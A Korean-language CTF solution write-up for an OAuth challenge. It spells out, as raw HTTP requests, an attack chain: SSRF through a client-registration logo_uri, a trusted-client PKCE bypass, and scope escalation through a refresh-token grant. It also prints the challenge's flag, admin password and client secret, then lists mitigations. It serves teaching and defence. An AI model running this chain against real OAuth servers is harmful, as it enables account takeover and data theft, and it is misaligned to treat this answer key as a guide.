# OAuth CTF Advanced - Attack Flow Documentation

## 목표
`MSG{0auth_pp_f0nt_ch41n_m4st3r}` 플래그를 획득하기 위해 `/api/admin/flag` 엔드포인트에 접근

## 요구사항
- `ADMIN_SECRETS` 스코프를 가진 유효한 Access Token 필요
- Admin 계정으로 인증된 토큰이어야 함

---

## 공격 체인 (Attack Chain)

### Step 1: SSRF via Client Registration
**취약점**: Dynamic Client Registration의 `logo_uri` 파라미터에서 SSRF 발생

```http
POST /oauth/register
Content-Type: application/json

{
  "client_name": "Attacker Client",
  "redirect_uris": ["http://localhost:8080/auth/callback"],
  "logo_uri": "http://auth-server:8000/internal/admin/hint"
}
```

**결과**:
- `logo_fetch_result`에서 내부 엔드포인트 응답 획득
- Admin 계정 정보: `MSG_CTF_HACKER` / `Wh3r3_is_SSRF?!`
- Trusted Client 정보: `msg_developer_portal` / `dev_portal_secret_2024`

**핵심 발견**:
```json
{
  "admin_credentials": {
    "username": "MSG_CTF_HACKER",
    "password": "Wh3r3_is_SSRF?!",
    "role": "administrator",
    "user_id": "user_admin_001"
  },
  "trusted_client": {
    "client_id": "msg_developer_portal",
    "client_secret": "dev_portal_secret_2024",
    "privileges": "elevated",
    "redirect_uris": ["http://localhost:8080/auth/callback"]
  }
}
```

---

### Step 2: OAuth Authorization with Admin Account
**방법**: 추출한 admin 계정으로 OAuth 인증 플로우 시작

```http
POST /oauth/authorize
Content-Type: application/x-www-form-urlencoded

client_id=msg_developer_portal
&redirect_uri=http://localhost:8080/auth/callback
&response_type=code
&scope=read
&state=random_state
&username=MSG_CTF_HACKER
&password=Wh3r3_is_SSRF?!
&action=login
```

**결과**:
- 302 리다이렉트로 Authorization Code 획득
- 예: `code=code_a1b2c3d4e5f6...`

---

### Step 3: PKCE Bypass - Token Exchange
**취약점**: Trusted Client (`msg_developer_portal`)는 PKCE 검증을 우회할 수 있음

**정상적인 플로우라면**:
- Authorization Code 발급 시 `code_challenge` 필요
- Token 교환 시 `code_verifier` 검증 필요

**하지만 Trusted Client는**:
- `code_challenge` 없이 Authorization Code 발급 가능
- `code_verifier` 없이 Token 교환 가능

```http
POST /oauth/token
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code
&code=code_a1b2c3d4e5f6...
&client_id=msg_developer_portal
&client_secret=dev_portal_secret_2024
&redirect_uri=http://localhost:8080/auth/callback
```

**결과**:
```json
{
  "access_token": "eyJhbGc...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "refresh_xyz123...",
  "scope": "read"
}
```

---

### Step 4: Scope Escalation via Refresh Token
**취약점**: Refresh Token Grant에서 임의의 스코프 요청 가능

**정상적인 플로우라면**:
- 원래 부여된 스코프 범위 내에서만 갱신 가능
- `ADMIN_SECRETS` 스코프는 일반 사용자에게 부여되지 않음

**하지만 구현 상의 문제로**:
- Refresh Token 사용 시 `scope` 파라미터에 어떤 값이든 요청 가능
- 원래 스코프와 관계없이 새로운 스코프 부여됨

```http
POST /oauth/token
Content-Type: application/x-www-form-urlencoded

grant_type=refresh_token
&refresh_token=refresh_xyz123...
&client_id=msg_developer_portal
&client_secret=dev_portal_secret_2024
&scope=ADMIN_SECRETS
```

**결과**:
```json
{
  "access_token": "eyJhbGc...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "ADMIN_SECRETS",
  "admin_access": true
}
```

---

### Step 5: Capture the Flag
**방법**: `ADMIN_SECRETS` 스코프를 가진 Access Token으로 Admin 엔드포인트 접근

```http
GET /api/admin/flag
Authorization: Bearer eyJhbGc...
```

**결과**:
```json
{
  "success": true,
  "message": "Administrative access granted",
  "flag": "MSG{0auth_pp_f0nt_ch41n_m4st3r}",
  "user_id": "user_admin_001",
  "admin_data": {
    "database_key": "database_master_key_2024",
    "api_token": "admin_api_override_token",
    "research_notes": "prototype_pollution_research_notes"
  },
  "access_level": "ADMIN_SECRETS",
  "timestamp": "2024-01-01T00:00:00.000000"
}
```

---

## Rate Limiting 정책

### 1. Login Endpoint (`/oauth/authorize` POST)
- **제한**: IP당 5분(300초)에 10회
- **저장소**: `login_attempts` (in-memory)
- **검증 함수**: `check_login_rate_limit(ip_address)`
- **영향**: Brute force 공격 방어

### 2. Token Endpoint (`/oauth/token`)
- **제한**: IP당 1분(60초)에 5회
- **저장소**: `token_requests` (in-memory)
- **검증 함수**: `check_token_rate_limit()`
- **영향**: Token 생성/갱신 시도 제한
- **주의**: 이 CTF 공격 플로우는 총 2회의 토큰 요청만 필요 (Step 3, Step 4)

### 3. Admin Flag Endpoint (`/api/admin/flag`)
- **제한**: IP당 1분(60초)에 500회
- **저장소**: `admin_attempts` (in-memory)
- **검증 함수**: `check_rate_limit(ip_address, max_attempts=500, window=60)`
- **영향**: 플래그 엔드포인트 과도한 요청 방지
- **참고**: 500회는 충분히 관대한 제한 (Brute force 방어용)

### Rate Limiting 특징
- **IP 기반**: `X-Forwarded-For` 헤더 또는 `remote_addr` 사용
- **In-memory**: 서버 재시작 시 초기화됨
- **Sliding Window**: 시간 윈도우 내의 요청만 카운트

---

## 취약점 요약

### 1. SSRF (Server-Side Request Forgery)
- **위치**: `/oauth/register` - `logo_uri` 파라미터
- **영향**: 내부 네트워크 접근, 민감 정보 유출
- **완화 방안**:
  - URL 허용 목록 (Whitelist)
  - 내부 IP 대역 차단
  - 프로토콜 제한 (http/https만 허용)

### 2. Trusted Client PKCE Bypass
- **위치**: Token Exchange 로직
- **영향**: PKCE 보안 메커니즘 우회
- **완화 방안**:
  - 모든 클라이언트에 대해 PKCE 강제 적용
  - Trusted Client 개념 제거 또는 재검토

### 3. Scope Escalation via Refresh Token
- **위치**: `/oauth/token` - `grant_type=refresh_token`
- **영향**: 권한 상승, 비인가 리소스 접근
- **완화 방안**:
  - 원래 부여된 스코프 범위 검증
  - 스코프 확대 시 재인증 요구
  - Admin 스코프는 refresh로 획득 불가하도록 제한

### 4. Insufficient Access Control
- **위치**: Refresh Token Grant 스코프 검증
- **영향**: 일반 사용자가 Admin 권한 획득
- **완화 방안**:
  - 사용자 역할(role) 기반 스코프 제한
  - Admin 스코프는 Admin 계정만 부여
  - Refresh Token에 원본 스코프 저장 및 검증

---

## 공격 시나리오 타임라인

```
[0분] SSRF로 내부 정보 수집
  ↓
[0분] Admin 계정 + Trusted Client 발견
  ↓
[1분] Admin 계정으로 OAuth 인증
  ↓
[1분] Authorization Code 획득
  ↓
[1분] PKCE Bypass로 Token 교환 (1차 토큰 요청)
  ↓
[1분] Refresh Token으로 Scope 상승 (2차 토큰 요청)
  ↓
[2분] ADMIN_SECRETS 스코프 획득
  ↓
[2분] FLAG 획득!
```

**총 소요 시간**: 약 2-3분 (수동 실행 시)
**토큰 요청 횟수**: 2회 (Rate Limit 문제 없음)
**로그인 시도**: 1회 (Rate Limit 문제 없음)

---

## 방어 메커니즘 분석

### 우회 가능한 방어
1. ✅ **Rate Limiting**: 공격에 필요한 요청 수가 제한 이하
2. ✅ **Client Registration Validation**: SSRF 방지 로직 부재
3. ✅ **PKCE Enforcement**: Trusted Client 예외 존재
4. ✅ **Scope Validation**: Refresh Token 스코프 검증 미흡

### 우회 불가능한 방어
1. ❌ **JWT Signature**: HS256 서명 검증 (위조 불가)
2. ❌ **Token Expiration**: 1시간 만료 (충분히 긴 시간)
3. ❌ **Client Authentication**: client_secret 필요 (SSRF로 획득)
4. ❌ **Database Validation**: 모든 데이터는 DB에 저장됨

---

## 참고 사항

### Pre-registered Client 정보
```python
PREREGISTERED_CLIENTS = {
    "msg_developer_portal": {
        "client_name": "MSG.COM Developer Portal",
        "client_secret": "dev_portal_secret_2024",
        "redirect_uris": [
            "http://localhost:8080/auth/callback",
            f"{BASE_URL}/auth/callback"
        ],
        "logo_uri": "https://example.com/logo.png",
        "description": "Official MSG.COM Developer Portal"
    }
}
```

### Admin Account 정보
```python
admin_username = "MSG_CTF_HACKER"
admin_password = "Wh3r3_is_SSRF?!"
user_id = "user_admin_001"
role = "admin"
```

### JWT Token 구조
```json
{
  "iss": "https://auth.oauth-ctf.local",
  "sub": "user_admin_001",
  "aud": "oauth-resource-server",
  "exp": 1234567890,
  "iat": 1234564290,
  "scope": "ADMIN_SECRETS",
  "token_type": "access"
}
```

---

## 자동화 스크립트
전체 공격 체인을 자동화한 Python 스크립트는 `solve_real_final.py` 참조

---

**문서 작성일**: 2024-10-29
**CTF 난이도**: Medium-Hard
**예상 풀이 시간**: 2-4시간 (화이트박스)
